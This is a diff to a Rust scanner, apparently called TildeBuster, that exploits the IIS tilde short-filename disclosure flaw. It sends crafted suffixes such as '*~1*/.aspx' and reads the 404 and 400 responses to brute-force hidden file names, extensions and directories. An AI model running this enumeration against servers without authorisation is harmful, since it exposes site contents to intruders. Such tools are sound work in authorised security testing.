@@ -151,24 +151,25 @@ impl TildeBuster {
                 }
                 None => {
                     match msg.kind {
+                        FSObject::NOT_EXISTING => {
+                            trace!("{:?}", msg);
+                        },
                         FSObject::FILE => {
-                                if msg.request.extension.len() < 3 {
-   
-                                } else {
-                                    if no_progress_bar {
-                                        println!(
-                                            "File\t{}.{}",
-                                            msg.request.filename,
-                                            msg.request.extension,
-                                        );
-                                    } else {
-                                        bar.println(format!(
-                                            "File\t{}.{}",
-                                            msg.request.filename,
-                                            msg.request.extension,
-                                        ));
-                                    }
-                                }
+                            if no_progress_bar {
+                                println!(
+                                    "File\t{}.{}",
+                                    msg.request.filename,
+                                    msg.request.extension,
+                                );
+                            } else {
+                                bar.println(format!(
+                                    "File\t{}.{}",
+                                    msg.request.filename,
+                                    msg.request.extension,
+                                ));
+                            }
+
+                            result_processor.maybe_add_result(msg);
                         },
                         FSObject::DIRECTORY => {
                             if no_progress_bar {
@@ -182,23 +183,25 @@ impl TildeBuster {
                                     msg.request.filename,
                                 ));
                             }
+
+                            result_processor.maybe_add_result(msg);
                         },
-                        FSObject::EXISTING_FILE => {
+                        FSObject::BRUTE_EXTENSION => {
                             for c in chars1.iter() {
                                 let mut request = msg.request.clone();
-                                request.extension = format!("{}{}", msg.request.extension, c);
+                                request.extension = format!("{}{}", request.extension, c);
                                 rt::spawn(TildeBuster::_brute_extension(tx1.clone(), client1.clone(), request));
                             }
-                        }
-                        FSObject::EXISTING_DIRECTORY => {
+                        },
+                        FSObject::BRUTE_FILENAME => {
                             for c in chars1.iter() {
                                 let mut request = msg.request.clone();
-                                request.filename = format!("{}{}", msg.request.filename, c);
+                                request.filename = format!("{}{}", request.filename, c);
                                 rt::spawn(TildeBuster::_brute_filename(tx1.clone(), client1.clone(), request));
                             }
                         },
-                        FSObject::NOT_EXISTING => {
-                            trace!("{:?}", msg);
+                        FSObject::CHECK_IF_DIRECTORY => {
+                            rt::spawn(TildeBuster::_check_if_directory(tx1.clone(), client1.clone(), msg.request));
                         },
                     }
                 },
@@ -218,12 +221,11 @@ impl TildeBuster {
         client: Client<HttpsConnector<HttpConnector>>,
         request: TildeRequest,
     ) -> impl Future<Item = (), Error = ()> {
-        let mut request = request;
-        request.url = format!("{}~1.{}{}", request.url, request.extension, "%3f".repeat(3 - request.extension.len()));
+        let vuln_url = format!("{}~1.{}{}", request.url, request.extension, "%3f".repeat(3 - request.extension.len()));
         let hyper_request = Request::builder()
             .header("User-Agent", &request.user_agent[..])
             .method(&request.http_method[..])
-            .uri(&request.url.parse::<hyper::Uri>().unwrap())
+            .uri(&vuln_url.parse::<hyper::Uri>().unwrap())
             .body(Body::from(request.http_body.clone()))
             .expect("Request builder");
 
@@ -241,7 +243,7 @@ impl TildeBuster {
                     },
                     (hyper::StatusCode::NOT_FOUND, _) => {
                         let res = SingleTildeScanResult {
-                            kind: FSObject::EXISTING_FILE,
+                            kind: FSObject::BRUTE_EXTENSION,
                             error: None,
                             request: request,
                         };
@@ -274,12 +276,11 @@ impl TildeBuster {
         request: TildeRequest,
     ) -> impl Future<Item = (), Error = ()> {
         let magic_suffix = "*~1*/.aspx";
-        let mut request = request;
-        request.url = format!("{}{}", request.url, magic_suffix); // TODO: do not append every time
+        let vuln_url = format!("{}{}", request.url, magic_suffix);
         let hyper_request = Request::builder()
             .header("User-Agent", &request.user_agent[..])
             .method(&request.http_method[..])
-            .uri(&request.url.parse::<hyper::Uri>().unwrap())
+            .uri(&vuln_url.parse::<hyper::Uri>().unwrap())
             .body(Body::from(request.http_body.clone()))
             .expect("Request builder");
 
@@ -288,32 +289,16 @@ impl TildeBuster {
             .and_then(move |res| {
                 match (res.status(), request.url.len()) {
                     (hyper::StatusCode::NOT_FOUND, 6) => {
-                        rt::spawn(TildeBuster::_check_if_directory(tx.clone(), client.clone(), request.clone())
-                            .and_then(move |is_directory| {
-                                match is_directory {
-                                    true => {
-                                        let res = SingleTildeScanResult {
-                                            kind: FSObject::DIRECTORY,
-                                            error: None,
-                                            request: request,
-                                        };
-                                        tx.send(res).unwrap();
-                                    },
-                                    false => {
-                                        let res = SingleTildeScanResult {
-                                            kind: FSObject::EXISTING_FILE,
-                                            error: None,
-                                            request: request,
-                                        };
-                                        tx.send(res).unwrap();
-                                    },
-                                }
-                                Ok(())
-                            }));
+                        let res = SingleTildeScanResult {
+                            kind: FSObject::CHECK_IF_DIRECTORY,
+                            error: None,
+                            request: request,
+                        };
+                        tx.send(res).unwrap();
                     },
                     (hyper::StatusCode::NOT_FOUND, _) => {
                         let res = SingleTildeScanResult {
-                            kind: FSObject::EXISTING_DIRECTORY,
+                            kind: FSObject::BRUTE_FILENAME,
                             error: None,
                             request: request,
                         };
@@ -344,12 +329,51 @@ impl TildeBuster {
         tx: Sender<SingleTildeScanResult>,
         client: Client<HttpsConnector<HttpConnector>>,
         request: TildeRequest,
-    ) -> impl Future<Item = bool, Error = ()> {
-        futures::future::ok(true) // TODO: implement check directory
+    ) -> impl Future<Item = (), Error = ()> {
+        let magic_suffix = "~1/.aspx";
+        let vuln_url = format!("{}{}", request.url, magic_suffix);
+        let hyper_request = Request::builder()
+            .header("User-Agent", &request.user_agent[..])
+            .method(&request.http_method[..])
+            .uri(vuln_url.parse::<hyper::Uri>().unwrap())
+            .body(Body::from(request.http_body.clone()))
+            .expect("Request builder");
+
+        client
+            .request(hyper_request)
+            .and_then(move |res| {
+                match res.status() {
+                    hyper::StatusCode::NOT_FOUND => {
+                        let res = SingleTildeScanResult {
+                            kind: FSObject::DIRECTORY,
+                            error: None,
+                            request: request,
+                        };
+                        tx.send(res).unwrap();
+                    },
+                    hyper::StatusCode::BAD_REQUEST => {
+                        let res = SingleTildeScanResult {
+                            kind: FSObject::BRUTE_EXTENSION,
+                            error: None,
+                            request: request,
+                        };
+                        tx.send(res).unwrap();
+                    },
+                    _ => {
+                        warn!("Got invalid HTTP status code when checking if vulnerable: {}", res.status());
+                    },
+                }
+
+                Ok(())
+            })
+            .or_else(|e| {
+                warn!("Got HTTP error when bruteforcing the filename: {}", e);
+                Ok(())
+            })
     }
 
     pub fn check_iis_version(&self, client: &Client<HttpsConnector<HttpConnector>>) -> impl Future<Item = IISVersion, Error = hyper::Error> {
-        let request = Request::builder()
+        let hyper_request = Request::builder()
             .header("User-Agent", &self.user_agent[..])
             .method(&self.http_method[..])
             .uri(self.url.parse::<hyper::Uri>().unwrap())
@@ -357,7 +381,7 @@ impl TildeBuster {
             .expect("Request builder");
 
         client
-            .request(request)
+            .request(hyper_request)
             .and_then(move |res| {
                 let version = res.headers().get("Server").unwrap().to_str().unwrap();
                 Ok(TildeBuster::map_iis_version(version))
@@ -384,7 +408,7 @@ impl TildeBuster {
     pub fn check_if_vulnerable(&self, client: &Client<HttpsConnector<HttpConnector>>, version: IISVersion) -> impl Future<Item = bool, Error = hyper::Error> {
         let magic_suffix = "*~1*/.aspx";
         let vuln_url = format!("{}{}", self.url, magic_suffix);
-        let request = Request::builder()
+        let hyper_request = Request::builder()
             .header("User-Agent", &self.user_agent[..])
             .method(&self.http_method[..])
             .uri(vuln_url.parse::<hyper::Uri>().unwrap())
@@ -392,7 +416,7 @@ impl TildeBuster {
             .expect("Request builder");
 
         client
-            .request(request)
+            .request(hyper_request)
             .and_then(|res| {
                 match res.status() {
                     hyper::StatusCode::NOT_FOUND => Ok(true),
